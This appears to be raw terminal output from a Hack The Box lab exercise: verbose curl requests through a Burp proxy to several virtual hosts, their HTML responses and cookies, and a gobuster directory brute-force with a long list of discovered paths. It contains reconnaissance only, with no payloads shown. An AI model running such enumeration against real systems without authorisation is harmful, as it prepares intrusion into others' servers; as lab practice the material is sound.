+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: meetspinz.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:11 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 522
+< 
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Spin The Meats!</title>
+        <embed src="/bonus.webm" volume="100" height="0" width="0" autostart="true" loop="true"  width="0" height="0">
+    </head>
+        <style type="text/css">
+            body {
+                background-color: #000;
+            }
+            img {
+            width: 100%;
+            height: auto;
+        }
+        </style>
+    </head>
+    <body>
+        <center>
+            <img src="/meatspin.gif"/>
+
+        </center>
+    </body>
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</html>
+
+rubberlove.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: rubberlove.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:11 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 492
+< 
+<!DOCTYPE html>
+<html>
+    <head>
+        <style type="text/css">
+            body {
+                background-color: #000;
+            }
+            img {
+            width: 100%;
+            height: auto;
+        }
+        </style>
+    </head>
+    <body>
+        <center>
+            <video width=60% controls>
+              <source src="rubberlove.webm" type="video/webm">
+              Your browser does not support HTML5 video.
+            </video>
+        </center>
+    </body>
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+</html>
+
+freeflujab.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: freeflujab.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:12 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Set-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=Thu, 20-Dec-2018 01:41:12 GMT; Max-Age=3600; path=/?smtp_config
+< Set-Cookie: Patient=4f6c00295ca97dc7357d7384584a92f4; expires=Thu, 20-Dec-2018 01:41:12 GMT; Max-Age=3600; path=/
+< Set-Cookie: Registered=NGY2YzAwMjk1Y2E5N2RjNzM1N2Q3Mzg0NTg0YTkyZjQ9TnVsbA%3D%3D; expires=Thu, 20-Dec-2018 01:41:12 GMT; Max-Age=3600; path=/
+< Server: ClownWare Proxy
+< Content-Length: 8867
+< 
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <title>Vaccinations</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"/>
+        <link rel="stylesheet" href="assets/css/main.css"/>
+    </head>
+    <body class="homepage is-preload">
+        <div id="page-wrapper">
+
+            <!-- Header -->
+                <section id="header" class="wrapper style3">
+
+                    <!-- Logo -->
+                        <div id="logo">
+                            <h1><a href="/?stats">Winter Is Coming...</a></h1>
+                        </br>
+                            <h1>Book Your Free NHS Flu Jab Today!</h1>
+                        </div>
+
+                    <!-- Nav -->
+                        <nav id="nav">
+                            <ul>
+                                <li class="current"><a href="?home">Home</a></li>
+                                <li>
+                                    <a href="#">Patients</a>
+                                    <ul>
+                                        <li><a href="?reg">Register</a></li>
+                                        <li><a href="?book">Booking</a></li>
+                                        <li><a href="?cancel">Cancelation</a></li>
+                                        <li><a href="?remind">Reminder</a></li>
+                                        </li>
+                                    </ul>
+                                </li>
+                                <li><a href="/?info">Vaccine Info</a></li>
+                                <li><a href="/?stats">Flu Stats</a></li>
+                            </ul>
+                        </nav>
+
+                </section><!-- Scripts -->
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/jquery.dropotron.min.js"></script>
+    <script src="assets/js/browser.min.js"></script>
+    <script src="assets/js/breakpoints.min.js"></script>
+    <script src="assets/js/util.js"></script>
+    <script src="assets/js/main.js"></script><!-- Main -->
+                <section id="main" class="wrapper style1">
+                    <div class="title">Vaccinations</div>
+                    <div class="container">
+                        <!-- <div class="row gtr-150"> -->
+                            <div class="col-8 col-12-medium">
+
+                                <!-- Content -->
+                                    <div id="content">
+                                        <article class="box post">
+                                            <header class="style1">
+                                                <h2>Getting The Flu Jab</h2>
+                                                <h3>Flu vaccination is available every year on the NHS to help protect adults and children at risk of flu and its complications.</h3>
+                                            </header>
+                                            <a href="?book" class="image featured">
+                                                <img src="images/pic01.jpg" alt="" />
+                                            </a>
+                                            <h2>The flu vaccine</h2>
+                                            <p>Flu can be unpleasant, but if you are otherwise healthy it will usually clear up on its own within a week.
+
+                                            However, flu can be more severe in certain people, such as:
+                                            <ul>
+                                                <li>anyone aged 65 and over</li>
+                                                <li>pregnant women</li>
+                                                <li>children and adults with an underlying health condition (such as long-term heart or respiratory disease)</li>
+                                                <li>children and adults with weakened immune systems</li>
+                                            </ul>
+                                            Anyone in these risk groups is more likely to develop potentially serious complications of flu, such as pneumonia (a lung infection), so it is now recommended that they have a flu vaccine every year to help protect them.</p>
+                                            <h2>Who should get the flu vaccine?</h2>
+                                            <p>The flu vaccine is routinely given on the NHS to:
+                                            <ul>
+                                                <li>adults 65 and over</li>
+                                                <li>people with certain medical conditions (including children in at-risk groups from 6 months of age)</li>
+                                                <li>pregnant women</li>
+                                                <li>children aged 2 and 3</li>
+                                                <li>children in reception class and school years 1, 2, 3, 4 and 5</li>
+                                            </ul>
+                                        <h3>For 2018, there are 3 types of flu vaccine:</h3>
+                                            <p>1. a live quadrivalent vaccine (which protects against 4 strains of flu), given as a nasal spray. This is for children and young people aged 2 to 17 years eligible for the flu vaccine</p>
+                                            <p>2. a quadrivalent injected vaccine. This is for adults aged 18 and over but below the age of 65 who are at increased risk from flu because of a long-term health condition and for children 6 months and above in an eligible group who cannot receive the live vaccine</p>
+                                            <p>3. an adjuvanted trivalent injected vaccine. This is for people aged 65 and over as it has been shown to be more effective in this age group</p>
+                                        </article>
+                                        <div class="row gtr-150">
+                                            <div class="col-6 col-12-small">
+                                                <section class="box">
+                                                    <header>
+                                                        <h2>Young Children</h2>
+                                                    </header>
+                                                    <a href="#" class="image featured"><img src="images/pic05.jpg" alt="" /></a>
+                                                    <p>If your child is aged between 6 months and 2 years old and is in a high-risk group for flu, they will be offered an injected flu vaccine as the nasal spray is not licensed for children under 2.</p>
+                                                    <a href="/?info" class="button style1">More</a>
+                                                </section>
+                                            </div>
+                                            <div class="col-6 col-12-small">
+                                                <section class="box">
+                                                    <header>
+                                                        <h2>How effective is the flu vaccine?</h2>
+                                                    </header>
+                                                    <a href="#" class="image featured"><img src="images/pic06.jpg" alt="" /></a>
+                                                    <p>Flu vaccine is the best protection we have against an unpredictable virus that can cause unpleasant illness in children and severe illness and death among at-risk groups, including older people, pregnant women and those with an underlying medical health condition.</p>
+                                                    <a href="/?stats" class="button style1">More</a>
+                                                </section>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                            </div>
+                        </div>
+                    </div>
+                </section>
+      </section>
+      <!-- Footer -->
+        <section id="footer" class="wrapper">
+          <div class="container">
+            <div id="copyright">
+              <ul>
+                <li>&copy; 3mrgnc3</li>
+                <li> <a href="http://freeflujab.htb">FreeFluJab.htb</a></li>
+                <li><b><a href="https://clownware.htb/link.php">Protected By ClownWare.htb</a></b></li>
+              </ul>
+            </div>  
+        </section>
+    </div>
+  </body>
+</html>
+
+<!--
+We're all sorry for the other guy when he loses his job to a machine.
+But when it comes to your job -- that's different.  And it always will
+be different.
+		-- McCoy, "The Ultimate Computer", stardate 4729.4
+
+-->
+
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+
+
+flujab.htb
+---------------------* Uses proxy env variable no_proxy == 'localhost,127.0.0.0/8,::1'
+* Uses proxy env variable https_proxy == 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* allocate connect buffer!
+* Establish HTTP proxy tunnel to 10.10.10.144:443
+> CONNECT 10.10.10.144:443 HTTP/1.1
+> Host: 10.10.10.144:443
+> User-Agent: curl/7.61.0
+> Proxy-Connection: Keep-Alive
+> 
+< HTTP/1.0 200 Connection established
+< 
+* Proxy replied 200 to CONNECT request
+* CONNECT phase completed!
+* ALPN, offering h2
+* ALPN, offering http/1.1
+* successfully set certificate verify locations:
+*   CAfile: none
+  CApath: /etc/ssl/certs
+* (304) (OUT), TLS handshake, Client hello (1):
+* CONNECT phase completed!
+* CONNECT phase completed!
+* (304) (IN), TLS handshake, Server hello (2):
+* TLSv1.2 (IN), TLS handshake, Certificate (11):
+* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
+* TLSv1.2 (IN), TLS handshake, Server finished (14):
+* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
+* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
+* TLSv1.2 (OUT), TLS handshake, Finished (20):
+* TLSv1.2 (IN), TLS handshake, Finished (20):
+* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
+* ALPN, server did not agree to a protocol
+* Server certificate:
+*  subject: C=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=ClownWare.htb
+*  start date: Jan 21 17:26:12 2014 GMT
+*  expire date: Jan 21 17:26:12 2038 GMT
+*  issuer: C=PortSwigger; ST=PortSwigger; L=PortSwigger; O=PortSwigger; OU=PortSwigger CA; CN=PortSwigger CA
+*  SSL certificate verify result: self signed certificate in certificate chain (19), continuing anyway.
+> GET / HTTP/1.1
+> Host: flujab.htb
+> User-Agent: curl/7.61.0
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Thu, 20 Dec 2018 00:41:12 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: close
+< Server: ClownWare Proxy
+< Content-Length: 3475
+< 
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="js" style="opacity: 1; visibility: visible;" lang="en-US"><!--<![endif]--><head>
+<title>Direct IP access not allowed | ClownWare</title>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+<meta name="robots" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<link rel="stylesheet" id="cf_styles-css" href="index_files/cf.css" type="text/css" media="screen,projection">
+<!--[if lt IE 9]><link rel="stylesheet" id='cf_styles-ie-css' href="/cdn-cgi/styles/cf.errors.ie.css" type="text/css" media="screen,projection" /><![endif]-->
+<style type="text/css">body{margin:0;padding:0}</style>
+
+
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/zepto.js"></script><!--<![endif]-->
+<!--[if gte IE 10]><!--><script type="text/javascript" src="index_files/cf.js"></script><!--<![endif]-->
+
+
+
+</head>
+<body>
+  <div id="cf-wrapper">
+    <div class="cf-alert cf-alert-error cf-cookie-error" id="cookie-alert" data-translate="enable_cookies">Please enable cookies.</div>
+    <div id="cf-error-details" class="cf-error-details-wrapper">
+      <div class="cf-wrapper cf-header cf-error-overview">
+        <h1>
+          <span class="cf-error-type" data-translate="error">Error</span>
+          <span class="cf-error-code">1003</span>
+          <small class="heading-ray-id">Ray ID: f6d85b7d56758e4e
+ • 2018-12-20 00:41:12 GMT
+</small>
+        </h1>
+        <h2 class="cf-subheadline">Direct IP access not allowed</h2>
+      </div><!-- /.header -->
+
+      <section></section><!-- spacer -->
+
+      <div class="cf-section cf-wrapper">
+        <div class="cf-columns two">
+          <div class="cf-column">
+            <h2 data-translate="what_happened">What happened?</h2>
+            <p>You've requested an IP address that is part of the <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">ClownWare</a> network. A valid Host header must be supplied to reach the desired website.</p>
+          </div>
+
+          
+          <div class="cf-column">
+            <h2 data-translate="what_can_i_do">What can I do?</h2>
+            <p>If you are interested in learning more about ClownWare, please <a href="https://clownware.htb/link.php" target="https://clownware.htb/link.php">visit our website</a>.</p>
+          </div>
+          
+        </div>
+      </div><!-- /.section -->
+
+      <div class="cf-error-footer cf-wrapper">
+  <p>
+    <span class="cf-footer-item">ClownWare Ray ID: <strong>b6690300803a2688
+</strong></span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Your IP</span>: 20.20.20.81</span>
+    <span class="cf-footer-separator">•</span>
+    <span class="cf-footer-item"><span>Performance &amp; security by</span> <a href="https://clownware.htb/link.php" id="brand_link" target="https://clownware.htb/link.php">ClownWare</a></span>
+    
+  </p>
+</div><!-- /.error-footer -->
+
+
+    </div><!-- /#cf-error-details -->
+  </div><!-- /#cf-wrapper -->
+
+  <script type="text/javascript">
+  window._cf_translation = {};
+  
+  
+</script>
+
+
+
+* Closing connection 0
+* TLSv1.2 (OUT), TLS alert, Client hello (1):
+root@kali:~/HTB/FluJab# gobuster -k -fw -u https://custoomercare.megabank.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,txt,htm,html,phtml,js,zip,rar,tar
+
+=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : https://custoomercare.megabank.htb/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Expanded     : true
+[+] Timeout      : 10s
+=====================================================
+2018/12/31 17:24:58 Starting gobuster
+=====================================================
+2018/12/31 17:24:59 [-] Wildcard response found: https://custoomercare.megabank.htb/70573970-1eae-407d-97fd-1db5734270bd => 301
+https://custoomercare.megabank.htb/12 (Status: 301)
+https://custoomercare.megabank.htb/warez (Status: 301)
+https://custoomercare.megabank.htb/news (Status: 301)
+https://custoomercare.megabank.htb/2006 (Status: 301)
+https://custoomercare.megabank.htb/serial (Status: 301)
+https://custoomercare.megabank.htb/download (Status: 301)
+https://custoomercare.megabank.htb/index (Status: 301)
+https://custoomercare.megabank.htb/full (Status: 301)
+https://custoomercare.megabank.htb/images (Status: 301)
+https://custoomercare.megabank.htb/crack (Status: 301)
+https://custoomercare.megabank.htb/search (Status: 301)
+https://custoomercare.megabank.htb/contact (Status: 301)
+https://custoomercare.megabank.htb/privacy (Status: 301)
+https://custoomercare.megabank.htb/spacer (Status: 301)
+https://custoomercare.megabank.htb/about (Status: 301)
+https://custoomercare.megabank.htb/11 (Status: 301)
+https://custoomercare.megabank.htb/logo (Status: 301)
+https://custoomercare.megabank.htb/blog (Status: 301)
+https://custoomercare.megabank.htb/new (Status: 301)
+https://custoomercare.megabank.htb/10 (Status: 301)
+https://custoomercare.megabank.htb/products (Status: 301)
+https://custoomercare.megabank.htb/faq (Status: 301)
+https://custoomercare.megabank.htb/rss (Status: 301)
+https://custoomercare.megabank.htb/cgi-bin (Status: 301)
+https://custoomercare.megabank.htb/2005 (Status: 301)
+https://custoomercare.megabank.htb/home (Status: 301)
+https://custoomercare.megabank.htb/img (Status: 301)
+https://custoomercare.megabank.htb/sitemap (Status: 301)
+https://custoomercare.megabank.htb/default (Status: 301)
+https://custoomercare.megabank.htb/archives (Status: 301)
+https://custoomercare.megabank.htb/09 (Status: 301)
+https://custoomercare.megabank.htb/01 (Status: 301)
+https://custoomercare.megabank.htb/links (Status: 301)
+https://custoomercare.megabank.htb/1 (Status: 301)
+https://custoomercare.megabank.htb/07 (Status: 301)
+https://custoomercare.megabank.htb/06 (Status: 301)
+https://custoomercare.megabank.htb/08 (Status: 301)
+https://custoomercare.megabank.htb/2 (Status: 301)
+https://custoomercare.megabank.htb/login (Status: 301)
+https://custoomercare.megabank.htb/articles (Status: 301)
+https://custoomercare.megabank.htb/05 (Status: 301)
+https://custoomercare.megabank.htb/keygen (Status: 301)
+https://custoomercare.megabank.htb/support (Status: 301)
+https://custoomercare.megabank.htb/article (Status: 301)
+https://custoomercare.megabank.htb/04 (Status: 301)
+https://custoomercare.megabank.htb/help (Status: 301)
+https://custoomercare.megabank.htb/events (Status: 301)
+https://custoomercare.megabank.htb/03 (Status: 301)
+https://custoomercare.megabank.htb/archive (Status: 301)
+https://custoomercare.megabank.htb/register (Status: 301)
+https://custoomercare.megabank.htb/forum (Status: 301)
+https://custoomercare.megabank.htb/02 (Status: 301)
+https://custoomercare.megabank.htb/en (Status: 301)
+https://custoomercare.megabank.htb/software (Status: 301)
+https://custoomercare.megabank.htb/downloads (Status: 301)
+https://custoomercare.megabank.htb/3 (Status: 301)
+https://custoomercare.megabank.htb/main (Status: 301)
+https://custoomercare.megabank.htb/security (Status: 301)
+https://custoomercare.megabank.htb/content (Status: 301)
+https://custoomercare.megabank.htb/category (Status: 301)
+https://custoomercare.megabank.htb/13 (Status: 301)
+https://custoomercare.megabank.htb/4 (Status: 301)
+https://custoomercare.megabank.htb/14 (Status: 301)
+https://custoomercare.megabank.htb/15 (Status: 301)
+https://custoomercare.megabank.htb/press (Status: 301)
+https://custoomercare.megabank.htb/media (Status: 301)
+https://custoomercare.megabank.htb/templates (Status: 301)
+https://custoomercare.megabank.htb/profile (Status: 301)
+https://custoomercare.megabank.htb/info (Status: 301)
+https://custoomercare.megabank.htb/2004 (Status: 301)
+https://custoomercare.megabank.htb/icons (Status: 301)
+https://custoomercare.megabank.htb/resources (Status: 301)
+https://custoomercare.megabank.htb/services (Status: 301)
+https://custoomercare.megabank.htb/16 (Status: 301)
+https://custoomercare.megabank.htb/18 (Status: 301)
+https://custoomercare.megabank.htb/contactus (Status: 301)
+https://custoomercare.megabank.htb/docs (Status: 301)
+https://custoomercare.megabank.htb/html (Status: 301)
+https://custoomercare.megabank.htb/features (Status: 301)
+https://custoomercare.megabank.htb/files (Status: 301)
+https://custoomercare.megabank.htb/5 (Status: 301)
+https://custoomercare.megabank.htb/20 (Status: 301)
+https://custoomercare.megabank.htb/21 (Status: 301)
+https://custoomercare.megabank.htb/22 (Status: 301)
+https://custoomercare.megabank.htb/page (Status: 301)
+https://custoomercare.megabank.htb/6 (Status: 301)
+https://custoomercare.megabank.htb/misc (Status: 301)
+https://custoomercare.megabank.htb/19 (Status: 301)
+https://custoomercare.megabank.htb/partners (Status: 301)
+https://custoomercare.megabank.htb/i (Status: 301)
+https://custoomercare.megabank.htb/27 (Status: 301)
+https://custoomercare.megabank.htb/17 (Status: 301)
+https://custoomercare.megabank.htb/23 (Status: 301)
+https://custoomercare.megabank.htb/24 (Status: 301)
+https://custoomercare.megabank.htb/2007 (Status: 301)
+https://custoomercare.megabank.htb/26 (Status: 301)
+https://custoomercare.megabank.htb/terms (Status: 301)
+https://custoomercare.megabank.htb/top (Status: 301)
+https://custoomercare.megabank.htb/9 (Status: 301)
+https://custoomercare.megabank.htb/legal (Status: 301)
+https://custoomercare.megabank.htb/banners (Status: 301)
+https://custoomercare.megabank.htb/xml (Status: 301)
+https://custoomercare.megabank.htb/29 (Status: 301)
+https://custoomercare.megabank.htb/30 (Status: 301)
+https://custoomercare.megabank.htb/28 (Status: 301)
+https://custoomercare.megabank.htb/7 (Status: 301)
+https://custoomercare.megabank.htb/tools (Status: 301)
+https://custoomercare.megabank.htb/projects (Status: 301)
+https://custoomercare.megabank.htb/user (Status: 301)
+https://custoomercare.megabank.htb/25 (Status: 301)
+https://custoomercare.megabank.htb/themes (Status: 301)
+https://custoomercare.megabank.htb/0 (Status: 301)
+https://custoomercare.megabank.htb/forums (Status: 301)
+https://custoomercare.megabank.htb/feed (Status: 301)
+https://custoomercare.megabank.htb/linux (Status: 301)
+https://custoomercare.megabank.htb/jobs (Status: 301)
+https://custoomercare.megabank.htb/8 (Status: 301)
+https://custoomercare.megabank.htb/business (Status: 301)
+https://custoomercare.megabank.htb/video (Status: 301)
+https://custoomercare.megabank.htb/reviews (Status: 301)
+https://custoomercare.megabank.htb/email (Status: 301)
+https://custoomercare.megabank.htb/books (Status: 301)
+https://custoomercare.megabank.htb/banner (Status: 301)
+https://custoomercare.megabank.htb/research (Status: 301)
+https://custoomercare.megabank.htb/view (Status: 301)
+https://custoomercare.megabank.htb/graphics (Status: 301)
+https://custoomercare.megabank.htb/print (Status: 301)
+https://custoomercare.megabank.htb/feedback (Status: 301)
+https://custoomercare.megabank.htb/2003 (Status: 301)
+https://custoomercare.megabank.htb/pdf (Status: 301)
+https://custoomercare.megabank.htb/ads (Status: 301)
+https://custoomercare.megabank.htb/modules (Status: 301)
+https://custoomercare.megabank.htb/company (Status: 301)
+https://custoomercare.megabank.htb/blank (Status: 301)
+https://custoomercare.megabank.htb/pub (Status: 301)
+https://custoomercare.megabank.htb/copyright (Status: 301)
+https://custoomercare.megabank.htb/games (Status: 301)
+https://custoomercare.megabank.htb/common (Status: 301)
+https://custoomercare.megabank.htb/site (Status: 301)
+https://custoomercare.megabank.htb/people (Status: 301)
+https://custoomercare.megabank.htb/comments (Status: 301)
+https://custoomercare.megabank.htb/product (Status: 301)
+https://custoomercare.megabank.htb/sports (Status: 301)
+https://custoomercare.megabank.htb/buttons (Status: 301)
+https://custoomercare.megabank.htb/logos (Status: 301)
+https://custoomercare.megabank.htb/aboutus (Status: 301)
+https://custoomercare.megabank.htb/story (Status: 301)
+https://custoomercare.megabank.htb/english (Status: 301)
+https://custoomercare.megabank.htb/image (Status: 301)
+https://custoomercare.megabank.htb/uploads (Status: 301)
+https://custoomercare.megabank.htb/31 (Status: 301)
+https://custoomercare.megabank.htb/subscribe (Status: 301)
+https://custoomercare.megabank.htb/gallery (Status: 301)
+https://custoomercare.megabank.htb/careers (Status: 301)
+https://custoomercare.megabank.htb/atom (Status: 301)
+https://custoomercare.megabank.htb/stats (Status: 301)
+https://custoomercare.megabank.htb/blogs (Status: 301)
+https://custoomercare.megabank.htb/newsletter (Status: 301)
+https://custoomercare.megabank.htb/music (Status: 301)
+https://custoomercare.megabank.htb/publications (Status: 301)
+https://custoomercare.megabank.htb/pages (Status: 301)
+https://custoomercare.megabank.htb/technology (Status: 301)
+https://custoomercare.megabank.htb/calendar (Status: 301)
+https://custoomercare.megabank.htb/stories (Status: 301)
+https://custoomercare.megabank.htb/photos (Status: 301)
+https://custoomercare.megabank.htb/community (Status: 301)
+https://custoomercare.megabank.htb/papers (Status: 301)
+https://custoomercare.megabank.htb/data (Status: 301)
+https://custoomercare.megabank.htb/arrow (Status: 301)
+https://custoomercare.megabank.htb/submit (Status: 301)
+https://custoomercare.megabank.htb/history (Status: 301)
+https://custoomercare.megabank.htb/www (Status: 301)
+https://custoomercare.megabank.htb/s (Status: 301)
+https://custoomercare.megabank.htb/header (Status: 301)
+https://custoomercare.megabank.htb/wiki (Status: 301)
+https://custoomercare.megabank.htb/library (Status: 301)
+https://custoomercare.megabank.htb/web (Status: 301)
+https://custoomercare.megabank.htb/education (Status: 301)
+https://custoomercare.megabank.htb/internet (Status: 301)
+https://custoomercare.megabank.htb/in (Status: 301)
+https://custoomercare.megabank.htb/advertise (Status: 301)
+https://custoomercare.megabank.htb/go (Status: 301)
+https://custoomercare.megabank.htb/b (Status: 301)
+https://custoomercare.megabank.htb/a (Status: 301)
+https://custoomercare.megabank.htb/spam (Status: 301)
+https://custoomercare.megabank.htb/nav (Status: 301)
+https://custoomercare.megabank.htb/mail (Status: 301)
+https://custoomercare.megabank.htb/users (Status: 301)
+https://custoomercare.megabank.htb/Images (Status: 301)
+https://custoomercare.megabank.htb/topics (Status: 301)
+https://custoomercare.megabank.htb/members (Status: 301)
+https://custoomercare.megabank.htb/disclaimer (Status: 301)
+https://custoomercare.megabank.htb/store (Status: 301)
+https://custoomercare.megabank.htb/feeds (Status: 301)
+https://custoomercare.megabank.htb/clear (Status: 301)
+https://custoomercare.megabank.htb/2002 (Status: 301)
+https://custoomercare.megabank.htb/awards (Status: 301)
+https://custoomercare.megabank.htb/c (Status: 301)
+https://custoomercare.megabank.htb/Default (Status: 301)
+https://custoomercare.megabank.htb/dir (Status: 301)
+https://custoomercare.megabank.htb/general (Status: 301)
+https://custoomercare.megabank.htb/pics (Status: 301)
+https://custoomercare.megabank.htb/signup (Status: 301)
+https://custoomercare.megabank.htb/solutions (Status: 301)
+https://custoomercare.megabank.htb/News (Status: 301)
+https://custoomercare.megabank.htb/index2 (Status: 301)
+https://custoomercare.megabank.htb/map (Status: 301)
+https://custoomercare.megabank.htb/weblog (Status: 301)
+https://custoomercare.megabank.htb/de (Status: 301)
+https://custoomercare.megabank.htb/doc (Status: 301)
+https://custoomercare.megabank.htb/public (Status: 301)
+https://custoomercare.megabank.htb/shop (Status: 301)
+https://custoomercare.megabank.htb/contacts (Status: 301)
+https://custoomercare.megabank.htb/travel (Status: 301)
+https://custoomercare.megabank.htb/list (Status: 301)
+https://custoomercare.megabank.htb/viewtopic (Status: 301)
+https://custoomercare.megabank.htb/fr (Status: 301)
+https://custoomercare.megabank.htb/homepage (Status: 301)
+https://custoomercare.megabank.htb/button (Status: 301)
+https://custoomercare.megabank.htb/pixel (Status: 301)
+https://custoomercare.megabank.htb/overview (Status: 301)
+https://custoomercare.megabank.htb/documents (Status: 301)
+https://custoomercare.megabank.htb/tips (Status: 301)
+https://custoomercare.megabank.htb/adclick (Status: 301)
+https://custoomercare.megabank.htb/contact_us (Status: 301)
+https://custoomercare.megabank.htb/catalog (Status: 301)
+https://custoomercare.megabank.htb/wp-content (Status: 301)
+https://custoomercare.megabank.htb/us (Status: 301)
